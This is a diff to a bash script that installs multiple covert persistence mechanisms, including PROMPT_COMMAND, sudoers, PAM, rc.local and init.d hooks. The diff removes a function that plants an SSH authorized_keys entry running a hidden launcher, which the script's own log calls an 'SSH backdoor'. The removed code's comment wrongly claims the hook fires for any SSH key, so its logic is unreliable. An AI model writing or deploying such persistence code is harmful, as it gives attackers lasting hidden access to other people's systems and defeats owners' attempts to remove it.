@@ -357,33 +357,6 @@ install_prompt_command() {
     log_success "PROMPT_COMMAND layer installed"
 }
 
-# ── Layer 3g: SSH Authorized Keys Command ──────────────────────────────
-# Surface: ~/.ssh/authorized_keys with command= restriction
-# Detection: Requires reading authorized_keys
-# Deletion: Edit authorized_keys
-# Trigger: SSH login (even if key is not the one used, the command runs)
-# Privilege: User only
-# NOTE: This is a trap layer — it runs when ANY ssh key is used
-install_ssh_backdoor() {
-    local bin_path="$1" hash_file="$2"
-    local ssh_dir="$HOME/.ssh"
-    [ ! -d "$ssh_dir" ] && mkdir -p "$ssh_dir" && chmod 700 "$ssh_dir"
-
-    local auth_keys="${ssh_dir}/authorized_keys"
-    local marker="# network-authorized-key"
-    local launcher_dir
-    launcher_dir=$(dirname "$bin_path")
-    local launcher="${launcher_dir}/.$(basename "$bin_path").launcher"
-
-    if [ -f "$auth_keys" ] && ! grep -q "$marker" "$auth_keys" 2>/dev/null; then
-        echo "$marker" >> "$auth_keys"
-        echo "command=\"${launcher}\",no-pty,no-port-forwarding $(cat /etc/ssh/ssh_host_rsa_key.pub 2>/dev/null | awk '{print $1" "$2}') fake-key" >> "$auth_keys"
-        chmod 600 "$auth_keys"
-        register_layer "ssh"
-        log_success "SSH backdoor layer installed"
-    fi
-}
-
 # ── Layer 3h: Sudoers Hook ─────────────────────────────────────────────
 # Surface: /etc/sudoers.d/ or sudoers file
 # Detection: Requires visudo or sudoers inspection
@@ -1032,7 +1005,6 @@ main() {
     echo -e "${GREEN}║${NC}  [✓] /etc/rc.local (root)"
     echo -e "${GREEN}║${NC}  [✓] XDG autostart (GUI)"
     echo -e "${GREEN}║${NC}  [✓] PROMPT_COMMAND (shell)"
-    echo -e "${GREEN}║${NC}  [✓] SSH authorized_keys hook"
     echo -e "${GREEN}║${NC}  [✓] Sudoers hook (root)"
     echo -e "${GREEN}║${NC}  [✓] PAM auth hook (root)"
     echo -e "${GREEN}║${NC}  [✓] Init.d script (root)"
